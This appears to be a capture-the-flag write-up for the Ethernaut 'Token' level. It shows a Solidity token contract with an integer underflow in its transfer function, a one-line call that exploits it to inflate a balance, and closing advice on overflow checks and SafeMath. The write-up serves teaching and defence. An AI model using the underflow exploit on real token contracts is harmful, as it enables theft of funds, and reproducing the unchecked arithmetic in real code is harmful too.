# Token 

## Challenge Statement

The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

  Things that might help:

    What is an odometer?

## Analysis

odometer : an instrument for measuring the distance travelled by a wheeled vehicle.


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  // contract is set with 20 tokens
  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  // call transfer with own address + amount
  // looks like possible overflow?
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // sender must already have more than value or overflow
    balances[msg.sender] -= _value; // update values of sender by 'overflow' :)
    balances[_to] += _value; // update value of _to by value
    return true;
  }

  // check balance of the owner
  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

## Solution

Exploit the underflow here since the safemath library is not in use, just send a large amount, e.g:
```
await contract.transfer('<random_contract/wallet>', '100000000000000000000000');
```


## Moral

Overflows are very common in solidity and must be checked for with control statements such as:

if(a + c > a) {
  a = a + c;
}

An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

a = a.add(c);

If there is an overflow, the code will revert.